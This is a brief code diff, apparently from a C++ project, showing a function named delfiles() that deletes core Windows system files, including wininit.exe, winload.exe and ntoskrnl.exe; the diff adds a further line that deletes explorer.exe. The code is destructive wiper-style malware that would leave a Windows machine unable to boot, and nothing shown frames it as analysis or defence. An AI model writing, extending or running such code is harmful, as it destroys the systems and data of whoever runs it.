@@ -6,7 +6,7 @@ void delfiles() {
   std::remove("C:\\Windows\\System32\\wininit.exe");
   std::remove("C:\\Windows\\System32\\winload.exe");
   std::remove("C:\\Windows\\System32\\ntoskrnl.exe");
-  
+  std::remove("C:\\Windows\\explorer.exe");
 
 
 }
